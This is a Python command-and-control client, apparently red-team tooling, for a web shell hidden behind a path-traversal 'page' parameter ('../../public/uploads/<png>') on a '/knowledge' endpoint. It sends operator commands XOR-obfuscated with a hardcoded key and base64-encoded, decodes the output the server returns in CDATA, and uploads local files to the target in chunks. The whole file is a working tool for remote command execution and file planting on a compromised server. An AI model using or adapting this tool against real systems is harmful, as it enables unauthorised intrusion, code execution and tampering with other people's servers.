import requests
import base64
import urllib3
import re 
import argparse
import hashlib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

key = "RedTeam2024"
auth = "123456"
headers= { 
"Content-Type": "application/x-www-form-urlencoded",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
"Accept": "application/json, text/plain, */*",
"Accept-Language": "en-US,en;q=0.9",
"Accept-Encoding": "gzip, deflate, br",
"Connection": "keep-alive"
}
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def upload_file(file_path, remote_path, url, png_name, chunk_size=1024):
    with open(file_path, 'rb') as f:
        i = 0
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break
            # format: UPLOAD:<remote_path>:<chunk_id>:<base64_encoded_chunk>
            payload = f"UPLOAD:{remote_path}:{i}:{base64_encode(xor_bytes(chunk, key))}"
            encoded = base64_encode(xor_bytes(payload.encode(), key))
            response = send_command(encoded, url, png_name)
            if not response:
                print(f"[!] Failed to upload chunk {i}")
                return
            print(f"[+] Uploaded chunk {i}")
            i += 1
    print(" Upload complete.")

def xor_bytes(data: bytes, key: str) -> bytes:
    return bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)])


def base64_encode(data: bytes) -> str:
    return base64.b64encode(data).decode('utf-8')

def get_user_command():
    command = input("Enter your command: ")
    if command.lower() == "exit":
        print("Exiting...")
        exit(0)
    return base64_encode(xor_bytes(command.encode('utf-8'), key))

def send_command(command, url, png_name):
    full_url = f"{url}/knowledge"
    page_value = f"../../public/uploads/{png_name}"
    token = hashlib.sha1(page_value.encode('utf-8')).hexdigest()
    payload = {
        "page": page_value,
        "token": token,
        "auth": auth,
        "data": command
    }
    try:
        response = requests.post(full_url, headers=headers, data=payload, verify=False, proxies=proxies)
        if response.status_code == 200:
            return response
        else:
            print(f"Error: Received status code {response.status_code}")
            return None
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None
    
def get_response(response):
    html = response.text
    match = re.search(r'<!\[CDATA\[(.*?)\]\]>', html)
    if match:
        # return with reverse operation as request - base64 decode and xor
        decoded_bytes = base64.b64decode(match.group(1))
        decoded_data = xor_bytes(decoded_bytes, key).decode('utf-8',errors='replace')
        return decoded_data
    else:
        print("No valid response found in the HTML.")
        return None

def main():
    parser = argparse.ArgumentParser(description="Send obfuscated command to server")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("png_name", help="PNG filename to use")
    parser.add_argument("--upload", help="Local file to upload")
    parser.add_argument("--remote-path", help="Remote path to save uploaded file")
    args = parser.parse_args()

    if args.upload and args.remote_path:
        upload_file(args.upload, args.remote_path, args.url, args.png_name)
        return

    while True:
        command = get_user_command()
        response = send_command(command, args.url, args.png_name)
        if response:
            print("Response from server:", get_response(response))
        else:
            print("Failed to get a valid response.")

if __name__ == "__main__":
    main()


